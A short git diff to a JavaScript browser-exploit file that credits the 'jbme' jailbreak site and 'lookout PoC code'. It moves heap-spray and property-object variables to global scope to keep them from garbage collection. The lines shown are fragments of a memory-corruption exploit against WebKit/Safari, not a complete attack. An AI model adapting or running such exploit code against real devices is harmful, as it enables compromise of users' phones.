@@ -1,7 +1,7 @@
 // Based on https://jbme.qwertyoruiop.com/
 // and lookout PoC code.
 var bufs = new Array(1000);
-var stale = 0;
+
 
 
 var trycatch = "";
@@ -10,8 +10,11 @@ var fc = new Function(trycatch);
 var fcp = 0;
 var smsh = new Uint32Array(0x10)
 
+// Trying to stop GC
+var props = {};
+var stale = 0;
 var target = [];
-setTimeout(function(){alert("Target has been around for 10 minutes" + target)}, 10*60*1000);
+setTimeout(function(){alert("Target has been around for 10 minutes" + target + props)}, 10*60*1000);
 
 var mem0 = 0;
 var mem1 = 0;
@@ -126,7 +129,7 @@ function go_() {
 		allocbufptrs();
 		return 10;
 	};
-	var props = {
+	props = {
 		p0: {value: 0},
 		p1: {value: 1},
 		p2: {value: 2},
